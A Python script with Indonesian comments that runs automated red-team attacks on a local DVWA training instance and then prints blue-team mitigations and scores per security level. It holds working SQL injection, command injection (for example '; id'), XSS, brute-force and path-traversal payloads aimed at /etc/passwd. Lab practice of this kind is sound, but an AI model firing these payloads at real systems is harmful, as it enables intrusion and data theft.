#!/usr/bin/env python3
"""
NOIR SOVEREIGN - GRAND EVOLUTION LOOP
======================================
Siklus pertempuran otonom: Red Team serang → Blue Team bertahan → Evolusi
Tracking: Level LOW → MEDIUM → HIGH + Skor Evolusi Real-time
"""

import requests
import re
import json
import datetime
import time
import os

TARGET = "http://localhost:9090"
EVOLUTION_FILE = "/root/htb_sandbox/evolution_log.json"
LOG_FILE = "/root/htb_sandbox/evolution.log"

session = requests.Session()
session.timeout = 15

def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def extract_token(html):
    patterns = [
        r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]{32})['\"]",
        r"value=['\"]([a-f0-9]{32})['\"].*?user_token",
    ]
    for p in patterns:
        m = re.search(p, html, re.IGNORECASE | re.DOTALL)
        if m:
            return m.group(1)
    hexes = re.findall(r"['\"]([a-f0-9]{32})['\"]", html)
    return hexes[0] if hexes else None

def login_dvwa():
    r = session.get(f"{TARGET}/setup.php", timeout=15)
    token = extract_token(r.text)
    if token:
        session.post(f"{TARGET}/setup.php",
                    data={"create_db": "Create / Reset Database", "user_token": token})
    time.sleep(1)
    r2 = session.get(f"{TARGET}/login.php", timeout=15)
    login_token = extract_token(r2.text)
    r3 = session.post(f"{TARGET}/login.php",
                     data={"username": "admin", "password": "password",
                           "Login": "Login", "user_token": login_token},
                     allow_redirects=True)
    return "index.php" in r3.url or "logout" in r3.text.lower()

def set_level(level):
    r = session.get(f"{TARGET}/security.php")
    tok = extract_token(r.text)
    session.post(f"{TARGET}/security.php",
                data={"security": level, "seclev_submit": "Submit", "user_token": tok or ""})

# ============================================================
# RED TEAM: Semua serangan
# ============================================================
def red_team_attack(level_name):
    log(f"\n{'='*60}")
    log(f"  RED TEAM ASSAULT — Level: {level_name.upper()}")
    log(f"{'='*60}")
    
    results = {}
    
    # === ATTACK 1: SQLi ===
    log("[ATTACK 1] SQL INJECTION")
    payloads_sqli = [
        "' OR '1'='1", "1' OR '1'='1' -- -",
        "' UNION SELECT user,password FROM users -- -",
        "1 OR 1=1-- -", "' OR 1=1#",
    ]
    sqli_result = {"status": "BLOCKED", "payload": None, "data": []}
    for p in payloads_sqli:
        try:
            r = session.get(f"{TARGET}/vulnerabilities/sqli/",
                           params={"id": p, "Submit": "Submit"})
            users = re.findall(r"First name:.*?<br\s*/?>.*?Surname:.*?<br\s*/?>",
                              r.text, re.IGNORECASE | re.DOTALL)
            if users:
                sqli_result = {"status": "COMPROMISED", "payload": p,
                              "data": [re.sub('<[^>]+>', '', u).strip() for u in users[:3]]}
                log(f"  [!!!] SQLi BERHASIL → {p}")
                break
            if "sql" in r.text.lower() and "error" in r.text.lower():
                sqli_result["status"] = "ERROR_LEAKED"
                log(f"  [+] SQL Error terdeteksi → {p}")
        except: pass
    log(f"  [RESULT] SQLi: {sqli_result['status']}")
    results["sql_injection"] = sqli_result

    # === ATTACK 2: Command Injection ===
    log("[ATTACK 2] COMMAND INJECTION")
    payloads_cmdi = [
        "127.0.0.1; id", "127.0.0.1 && id", "127.0.0.1|id",
        "127.0.0.1; cat /etc/hostname",
        "127.0.0.1 %26%26 id",
        "127.0.0.1\nid",
    ]
    cmdi_result = {"status": "BLOCKED", "payload": None, "output": []}
    for p in payloads_cmdi:
        try:
            r = session.post(f"{TARGET}/vulnerabilities/exec/",
                            data={"ip": p, "Submit": "Submit"})
            if re.search(r"uid=\d+\(", r.text):
                uid = re.findall(r"uid=\d+\([^)]+\)[^\n<]*", r.text)
                cmdi_result = {"status": "COMPROMISED", "payload": p, "output": uid[:2]}
                log(f"  [!!!] CMDi BERHASIL → {p}")
                for o in uid[:2]:
                    log(f"         OS: {re.sub('<[^>]+>','',o).strip()}")
                break
        except: pass
    log(f"  [RESULT] CMDi: {cmdi_result['status']}")
    results["command_injection"] = cmdi_result

    # === ATTACK 3: XSS ===
    log("[ATTACK 3] XSS REFLECTED")
    payloads_xss = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "<ScRiPt>alert(1)</ScRiPt>",
        "<body onload=alert(1)>",
        "'-alert(1)-'",
    ]
    xss_result = {"status": "BLOCKED", "payload": None}
    for p in payloads_xss:
        try:
            r = session.get(f"{TARGET}/vulnerabilities/xss_r/", params={"name": p})
            if p in r.text:
                xss_result = {"status": "COMPROMISED", "payload": p}
                log(f"  [!!!] XSS BERHASIL → {p[:50]}")
                break
            elif "&lt;" in r.text or "&#" in r.text:
                xss_result["status"] = "ENCODED"
        except: pass
    log(f"  [RESULT] XSS: {xss_result['status']}")
    results["xss_reflected"] = xss_result

    # === ATTACK 4: Brute Force ===
    log("[ATTACK 4] BRUTE FORCE")
    creds = [
        ("admin","password"),("gordonb","abc123"),("1337","charley"),
        ("pablo","letmein"),("smithy","password"),("admin","admin123"),
        ("admin","admin"),("admin","qwerty"),("admin","letmein"),
    ]
    brute_result = {"status": "BLOCKED", "cracked": None, "attempts": 0}
    for user, pw in creds:
        try:
            r_g = session.get(f"{TARGET}/vulnerabilities/brute/")
            tok = extract_token(r_g.text)
            params = {"username": user, "password": pw, "Login": "Login"}
            if tok: params["user_token"] = tok
            r = session.get(f"{TARGET}/vulnerabilities/brute/", params=params)
            brute_result["attempts"] += 1
            if "Welcome to the password protected area" in r.text:
                brute_result = {"status": "COMPROMISED", "cracked": f"{user}:{pw}",
                               "attempts": brute_result["attempts"]}
                log(f"  [!!!] BRUTE FORCE BERHASIL → {user}:{pw}")
                break
        except: pass
        time.sleep(0.05)
    log(f"  [RESULT] BruteForce: {brute_result['status']} ({brute_result['attempts']} attempts)")
    results["brute_force"] = brute_result

    # === ATTACK 5: LFI ===
    log("[ATTACK 5] LOCAL FILE INCLUSION")
    payloads_lfi = [
        "../../../../../../etc/passwd",
        "../../../etc/passwd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    ]
    lfi_result = {"status": "BLOCKED", "payload": None, "leaked": []}
    for p in payloads_lfi:
        try:
            r = session.get(f"{TARGET}/vulnerabilities/fi/", params={"page": p})
            if "root:x:0:0" in r.text or "root:/bin/" in r.text:
                lines = [l for l in r.text.split('\n') if ':' in l and '/bin/' in l][:4]
                lfi_result = {"status": "COMPROMISED", "payload": p, "leaked": lines}
                log(f"  [!!!] LFI BERHASIL → {p}")
                for l in lines[:3]:
                    log(f"         File: {l.strip()}")
                break
        except: pass
    log(f"  [RESULT] LFI: {lfi_result['status']}")
    results["file_inclusion"] = lfi_result

    # Hitung skor
    compromised = sum(1 for v in results.values() if v["status"] == "COMPROMISED")
    total = len(results)
    score = int(compromised / total * 100)
    log(f"\n  RED TEAM SCORE: {compromised}/{total} ({score}%)")
    return results, compromised, total

# ============================================================
# BLUE TEAM: Analisis serangan & tulis defense rules
# ============================================================
def blue_team_defend(red_results, level_name):
    log(f"\n{'='*60}")
    log(f"  BLUE TEAM COUNTER — Analyzing {level_name.upper()} attacks")
    log(f"{'='*60}")
    
    rules = []
    mitigations = {}

    if red_results.get("sql_injection", {}).get("status") == "COMPROMISED":
        payload = red_results["sql_injection"].get("payload", "unknown")
        rule = f"BLOCK SQL: Payload '{payload}' mengekspos database"
        rules.append(rule)
        mitigations["sql_injection"] = {
            "fix": "Gunakan Prepared Statements / Parameterized Query",
            "waf_rule": f"Blokir karakter: ', OR, UNION, SELECT, --, #",
            "detected_payload": payload
        }
        log(f"  [PATCH] SQLi → Prepared Statement + input sanitization")

    if red_results.get("command_injection", {}).get("status") == "COMPROMISED":
        payload = red_results["command_injection"].get("payload", "unknown")
        mitigations["command_injection"] = {
            "fix": "Gunakan escapeshellarg() / whitelist IP format",
            "waf_rule": "Blokir karakter: ;, |, &&, newline dalam input ping",
            "detected_payload": payload
        }
        log(f"  [PATCH] CMDi → escapeshellarg + regex whitelist IP")

    if red_results.get("xss_reflected", {}).get("status") == "COMPROMISED":
        payload = red_results["xss_reflected"].get("payload", "unknown")
        mitigations["xss_reflected"] = {
            "fix": "Gunakan htmlspecialchars() + Content-Security-Policy header",
            "waf_rule": "Encode semua output: < → &lt;  > → &gt;",
            "detected_payload": payload
        }
        log(f"  [PATCH] XSS → htmlspecialchars() + CSP header")

    if red_results.get("brute_force", {}).get("status") == "COMPROMISED":
        cred = red_results["brute_force"].get("cracked", "unknown")
        mitigations["brute_force"] = {
            "fix": "Rate limiting + CAPTCHA + account lockout setelah 5 gagal",
            "waf_rule": f"Max 5 login attempt per IP per menit. Kredensial lemah: {cred}",
            "detected_cred": cred
        }
        log(f"  [PATCH] BruteForce → Rate limit + lockout policy + kuat password")

    if red_results.get("file_inclusion", {}).get("status") == "COMPROMISED":
        payload = red_results["file_inclusion"].get("payload", "unknown")
        mitigations["file_inclusion"] = {
            "fix": "Whitelist file yang boleh diinclude, disable allow_url_include",
            "waf_rule": "Blokir path traversal: ../, %2F, php://",
            "detected_payload": payload
        }
        log(f"  [PATCH] LFI → File whitelist + disable allow_url_include")

    log(f"\n  [BLUE TEAM] {len(mitigations)} patch directive ditulis")
    return mitigations

# ============================================================
# EVOLUTION TRACKER
# ============================================================
def update_evolution(level, compromised, total, mitigations):
    try:
        with open(EVOLUTION_FILE, "r") as f:
            evo = json.load(f)
    except:
        evo = {
            "agent_name": "NOIR SOVEREIGN",
            "created_at": str(datetime.datetime.now()),
            "generation": 0,
            "cycles": [],
            "total_compromises": 0,
            "total_patches": 0,
            "skill_scores": {}
        }
    
    evo["generation"] += 1
    evo["total_compromises"] += compromised
    evo["total_patches"] += len(mitigations)
    
    cycle = {
        "generation": evo["generation"],
        "timestamp": str(datetime.datetime.now()),
        "level": level,
        "red_score": f"{compromised}/{total}",
        "red_pct": int(compromised/total*100),
        "blue_patches": len(mitigations),
        "status": "EVOLVING" if compromised > 0 else "STAGNANT"
    }
    evo["cycles"].append(cycle)
    evo["skill_scores"][level] = int(compromised/total*100)
    
    with open(EVOLUTION_FILE, "w") as f:
        json.dump(evo, f, indent=2, default=str)
    
    return evo

# ============================================================
# MAIN EVOLUTION LOOP
# ============================================================
if __name__ == "__main__":
    log("=" * 60)
    log("  NOIR SOVEREIGN GRAND EVOLUTION LOOP")
    log("  Red Team vs Blue Team — Multi-Level Combat")
    log("=" * 60)
    
    levels = ["low", "medium", "high"]
    
    # Login sekali di awal
    log("\n[*] Autentikasi ke target DVWA...")
    if not login_dvwa():
        log("[FATAL] Login gagal! Menghentikan loop.")
        exit(1)
    log("[+] Sesi aktif — memulai evolution loop")
    
    all_results = {}
    
    for level in levels:
        log(f"\n{'#'*60}")
        log(f"# GENERASI BARU — Security Level: {level.upper()}")
        log(f"{'#'*60}")
        
        set_level(level)
        time.sleep(1)
        
        # RED TEAM: Serang
        red_results, compromised, total = red_team_attack(level)
        
        # BLUE TEAM: Pertahankan
        mitigations = blue_team_defend(red_results, level)
        
        # Update Evolution Log
        evo = update_evolution(level, compromised, total, mitigations)
        
        all_results[level] = {
            "red": red_results,
            "blue": mitigations,
            "score": f"{compromised}/{total}"
        }
        
        log(f"\n[EVOLUTION] Gen #{evo['generation']} selesai")
        log(f"[EVOLUTION] Total kompromi historis: {evo['total_compromises']}")
        log(f"[EVOLUTION] Total patch ditulis   : {evo['total_patches']}")
        
        time.sleep(2)
    
    # Laporan Evolusi Final
    log(f"\n{'='*60}")
    log(f"  LAPORAN EVOLUSI FINAL — NOIR SOVEREIGN")
    log(f"{'='*60}")
    log(f"  Total Generasi   : {evo['generation']}")
    log(f"  Total Kompromi   : {evo['total_compromises']}")
    log(f"  Total Patch Ditulis: {evo['total_patches']}")
    log(f"\n  Skill Matrix (Red Team Win Rate per Level):")
    for lvl, score in evo["skill_scores"].items():
        bar = "█" * (score // 10) + "░" * (10 - score // 10)
        log(f"    {lvl.upper():8s} [{bar}] {score}%")
    log(f"\n[+] Evolution data: {EVOLUTION_FILE}")
    log("=" * 60)
